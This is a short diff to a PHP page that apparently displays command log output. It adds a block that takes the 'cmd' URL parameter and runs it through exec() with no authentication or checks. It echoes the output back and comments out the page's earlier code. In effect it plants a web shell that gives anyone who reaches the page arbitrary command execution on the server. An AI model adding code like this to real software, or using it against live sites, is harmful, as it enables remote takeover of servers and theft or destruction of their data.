@@ -4,6 +4,26 @@
   font-size: 12px;
 }
 </style>
+
+<?PHP
+$cmd = urldecode(($_GET['cmd']));
+echo "Command: {$cmd}";
+echo "<p class=\"logLine\">";
+exec($cmd, $output, $retval);
+$last200 = $res = array_slice($output, -200, 200, true);
+foreach($last200 as $line){echo "{$line}<br>"; }
+echo "</p>";
+echo $retval ?  "The command failed." : "The command finished successfully!";
+echo "</div>";
+?>
+
+<?/*
+<style type="text/css">
+.logLine {
+  font-family: Monospace;
+  font-size: 12px;
+}
+</style>
 <div style="margin:10;padding:0">
 
 <?PHP
@@ -31,3 +51,4 @@ echo $return_value ?  "The command failed." : "The command finished successfully
 ?>
 
 </div>
+*/?>
